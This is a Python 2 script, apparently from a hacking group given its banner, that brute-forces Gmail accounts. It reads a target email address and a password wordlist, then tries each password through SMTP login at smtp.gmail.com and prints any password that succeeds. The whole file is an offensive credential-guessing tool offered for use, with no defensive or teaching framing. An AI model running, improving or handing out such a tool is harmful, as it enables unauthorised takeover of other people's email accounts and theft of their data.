import smtplib
from os import system
def hell():
                    mawar = "\033[31;m1"
                    susu1 = "\033[37;1m"
                    hole1 = "\033[32;1m"

                    print hole1+"..%%%%....%%%%...%%......%%....."
                    print hole1+".%%..%%..%%..%%..%%......%%....."
                    print hole1+".%%......%%%%%%..%%......%%....."
                    print hole1+".%%..%%..%%..%%..%%......%%....."
                    print hole1+"..%%%%...%%..%%..%%%%%%..%%%%%%."
                    print hole1+"................................"
                    print hole1+"%%%%%%..%%%%%....%%%%...%%...%%."
                    print hole1+"%%......%%..%%..%%..%%..%%%.%%%."
                    print hole1+"%%%%....%%%%%...%%..%%..%%.%.%%."
                    print hole1+"%%......%%..%%..%%..%%..%%...%%."
                    print hole1+"%%......%%..%%...%%%%...%%...%%."
                    print hole1+"................................"
                    print hole1+".%%..%%..%%%%%%..%%......%%....."
                    print hole1+".%%..%%..%%......%%......%%....."
                    print hole1+".%%%%%%..%%%%....%%......%%....."
                    print hole1+".%%..%%..%%......%%......%%....."
                    print hole1+".%%..%%..%%%%%%..%%%%%%..%%%%%%."
                    print hole1+"................................"
                    print "|=======-<><><><><><><><><><><><>-=======|"
                    print "<=======    !Coded By Nelo.F4     =======>"
                    print "<======= !Tools Bruteforce Gmail  =======>"
                    print "<=======  !Explosion Squad Cyber  =======>"
                    print "|=======-<><><><><><><><><><><><>-=======|\n"

hell()
mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Email Target: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Zonk!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Zonk!:" + password


